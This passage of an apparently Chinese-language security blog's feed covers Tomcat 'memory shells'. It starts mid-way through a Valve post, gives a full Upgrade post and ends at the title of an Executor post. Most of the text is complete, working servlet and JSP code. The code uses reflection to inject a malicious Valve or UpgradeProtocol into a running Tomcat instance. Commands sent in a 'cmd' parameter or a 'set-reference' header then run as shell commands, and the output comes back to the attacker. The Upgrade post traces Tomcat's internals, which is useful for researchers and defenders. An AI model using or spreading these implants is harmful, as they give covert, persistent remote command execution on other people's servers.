class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">ValveBase</span> <span class="variable">valveBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (((HttpServletRequest) request).getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, ((HttpServletRequest) request).getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ((HttpServletRequest) request).getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                ((HttpServletResponse) response).getWriter().write(output);</span><br><span class="line">                ((HttpServletResponse) response).getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    standardContext.getPipeline().addValve(valveBase);</span><br><span class="line">    response.getWriter().write(<span class="string">&quot;Valve Inject Successfully...&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Valve/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat MemoryShell Of Upgrade</title>
      <link href="/2024/05/18/Tomcat-Upgrade/"/>
      <url>/2024/05/18/Tomcat-Upgrade/</url>
      
        <content type="html"><![CDATA[<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>中间件型内存马Upgrade依旧还是基于Connector的内存马注入，在中间件型内存马Executor中，利用的是ProtocolHandler中的Endpoint里的Executor组件，而Upgrade利用的是ProtocolHandler的另一个组成部分，即Processor里的Upgrade组件。</p><p><img src="/2024/05/18/Tomcat-Upgrade/1.png"></p><h2 id="Process-Analysis"><a href="#Process-Analysis" class="headerlink" title="Process Analysis"></a>Process Analysis</h2><p>Processor是一个接口，针对的不同协议，有着不同的具体实现类，由于采用的是HTTP协议，因此来看看org.apache.coyote.http11.Http11Processor。</p><p><img src="/2024/05/18/Tomcat-Upgrade/2.png"></p><p>Http11Processor在处理Upgrade时，会执行以下的步骤：</p><ul><li>Http11Processor#service方法会检查请求头中的Connection字段的值是否包含upgrade；</li><li>若请求头中的Connection字段的值包含upgrade，则会调用request#getHeader方法来获取请求头Upgrade，并根据获取到的结果来选择对应的Upgrade对象；</li><li>当upgradeProtocol不为空时，调用该对象的accept方法。</li></ul><p>因此，可以尝试在accept方法中插入恶意代码来达到命令执行的目的。</p><p><img src="/2024/05/18/Tomcat-Upgrade/3.png"></p><p>接下来看看httpUpgradeProtocols是怎么获取的，在Http11Processor初始化阶段，会对httpUpgradeProtocols赋值。</p><p><img src="/2024/05/18/Tomcat-Upgrade/4.png"></p><p>而在org.apache.coyote.http11.AbstractHttp11Protocol#createProcessor方法中会实例化一个Http11Processor对象，将httpUpgradeProtocols传入。</p><p><img src="/2024/05/18/Tomcat-Upgrade/5.png"></p><p>继续跟进看看org.apache.coyote.http11.AbstractHttp11Protocol中在何处对httpUpgradeProtocols进行了赋值，跟进org.apache.coyote.http11.AbstractHttp11Protocol#configureUpgradeProtocol方法，这里将httpUpgradeName和upgradeProtocol添加到httpUpgradeProtocols的HashMap中。</p><p><img src="/2024/05/18/Tomcat-Upgrade/6.png"></p><p>因此，通过反射调用将httpUpgradeProtocols添加一项，即可实现Upgrade内存马。通过下断点，找到一处httpUpgradeProtocols，实现路径request-&gt;request-&gt;connector-&gt;protocolHandler-&gt;httpUpgradeProtocols。</p><p><img src="/2024/05/18/Tomcat-Upgrade/7.png"></p><h2 id="Achievement"><a href="#Achievement" class="headerlink" title="Achievement"></a>Achievement</h2><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>动态注册Upgrade内存马的具体思路如下:</p><ul><li>获取httpUpgradeProtocols属性；</li><li>创建一个恶意的upgradeProtocol；</li><li>将恶意的upgradeProtocol插入到httpUpgradeProtocols中。</li></ul><h3 id="Dynamic-Registration"><a href="#Dynamic-Registration" class="headerlink" title="Dynamic Registration"></a>Dynamic Registration</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Connector;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.http11.Http11NioProtocol;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.SocketWrapperBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;UpgradeMemoryShellServlet&quot;, value = &quot;/UpgradeMemoryShellServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UpgradeMemoryShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">request1</span> <span class="operator">=</span> getField(request, <span class="string">&quot;request&quot;</span>);</span><br><span class="line">            <span class="type">Connector</span> <span class="variable">connector</span> <span class="operator">=</span> (Connector) getField(request1, <span class="string">&quot;connector&quot;</span>);</span><br><span class="line">            <span class="type">Http11NioProtocol</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> (Http11NioProtocol) getField(connector, <span class="string">&quot;protocolHandler&quot;</span>);</span><br><span class="line">            <span class="type">HashMap</span> <span class="variable">httpUpgradeProtocols</span> <span class="operator">=</span> (HashMap) getField(protocolHandler, <span class="string">&quot;httpUpgradeProtocols&quot;</span>);</span><br><span class="line">            httpUpgradeProtocols.put(<span class="string">&quot;H3rmesk1t&quot;</span>, <span class="keyword">new</span> <span class="title class_">EvilUpgrade</span>());</span><br><span class="line">            response.getWriter().println(<span class="string">&quot;Upgrade Inject Successfully...&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilUpgrade</span> <span class="keyword">implements</span> <span class="title class_">UpgradeProtocol</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getHttpUpgradeName</span><span class="params">(<span class="type">boolean</span> isSecure)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] getAlpnIdentifier() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getAlpnName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Processor <span class="title function_">getProcessor</span><span class="params">(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> InternalHttpUpgradeHandler <span class="title function_">getInternalUpgradeHandler</span><span class="params">(Adapter adapter, Request request)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">accept</span><span class="params">(Request request)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;set-reference&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] commands = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(commands).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) getField(request, <span class="string">&quot;response&quot;</span>);</span><br><span class="line">                    response.addHeader(<span class="string">&quot;set-message&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(output.getBytes(), StandardCharsets.UTF_8));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getField</span><span class="params">(Object obj, String field)</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> clazz.getDeclaredField(field);</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField.get(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Upgrade/8.png"></p><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.charset.StandardCharsets&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Connector&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.http11.Http11NioProtocol&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">EvilUpgrade</span> <span class="keyword">implements</span> <span class="title class_">UpgradeProtocol</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHttpUpgradeName</span><span class="params">(<span class="type">boolean</span> isSecure)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] getAlpnIdentifier() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAlpnName</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Processor <span class="title function_">getProcessor</span><span class="params">(SocketWrapperBase&lt;?&gt; socketWrapper, Adapter adapter)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> InternalHttpUpgradeHandler <span class="title function_">getInternalUpgradeHandler</span><span class="params">(Adapter adapter, Request request)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">accept</span><span class="params">(Request request)</span> &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;set-reference&quot;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">          <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          String[] commands = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">          <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(commands).getInputStream();</span><br><span class="line">          <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">          <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> (Response) getField(request, <span class="string">&quot;response&quot;</span>);</span><br><span class="line">          response.addHeader(<span class="string">&quot;set-message&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>(output.getBytes(), StandardCharsets.UTF_8));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">getField</span><span class="params">(Object obj, String field)</span> &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">    <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> clazz.getDeclaredField(field);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> declaredField.get(obj);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        clazz = clazz.getSuperclass();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">Object</span> <span class="variable">request1</span> <span class="operator">=</span> getField(request, <span class="string">&quot;request&quot;</span>);</span><br><span class="line">  <span class="type">Connector</span> <span class="variable">connector</span> <span class="operator">=</span> (Connector) getField(request1, <span class="string">&quot;connector&quot;</span>);</span><br><span class="line">  <span class="type">Http11NioProtocol</span> <span class="variable">protocolHandler</span> <span class="operator">=</span> (Http11NioProtocol) getField(connector, <span class="string">&quot;protocolHandler&quot;</span>);</span><br><span class="line">  <span class="type">HashMap</span> <span class="variable">httpUpgradeProtocols</span> <span class="operator">=</span> (HashMap) getField(protocolHandler, <span class="string">&quot;httpUpgradeProtocols&quot;</span>);</span><br><span class="line">  httpUpgradeProtocols.put(<span class="string">&quot;H3rmesk1t&quot;</span>, <span class="keyword">new</span> <span class="title class_">EvilUpgrade</span>());</span><br><span class="line">  response.getWriter().println(<span class="string">&quot;Upgrade Inject Successfully...&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Upgrade/9.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat MemoryShell Of Executor</title>
      <link href="/2024/05/18/Tomcat-Executor/"/>
      <url>/2024/05/18/Tomcat-Executor/</url>
      
